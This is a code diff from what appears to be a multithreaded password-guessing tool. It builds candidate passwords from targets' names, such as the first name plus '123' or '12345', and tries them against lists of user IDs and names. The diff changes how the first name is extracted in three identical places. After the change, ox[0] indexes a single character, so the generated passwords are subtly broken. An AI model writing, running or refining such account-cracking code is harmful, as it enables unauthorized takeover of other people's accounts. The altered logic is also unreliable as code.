@@ -704,7 +704,7 @@ def ___metode___():
         with ThreadPoolExecutor(max_workers=35) as (hayuk):
             for user in ids:
                 uid, Name = user.split('<=>')
-                ox = Name.split(' ')
+                ox =  Name.lower().split(' ')[0]
                 if ___password___ in ['1','01']:
                     pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                 elif ___password___ in ['2','02']:
@@ -734,7 +734,7 @@ def ___metode___():
         with ThreadPoolExecutor(max_workers=35) as (hayuk):
             for user in ids:
                 uid, Name = user.split('<=>')
-                ox = Name.split(' ')
+                ox = Name.lower().split(' ')[0]
                 if ___password___ in ['1','01']:
                     pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                 elif ___password___ in ['2','02']:
@@ -768,7 +768,7 @@ def ___metode___():
         with ThreadPoolExecutor(max_workers=35) as (hayuk):
             for user in ids:
                 uid, Name = user.split('<=>')
-                ox = Name.split(' ')
+                ox = Name.lower().split(' ')[0]
                 if ___password___ in ['1','01']:
                     pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                 elif ___password___ in ['2','02']:
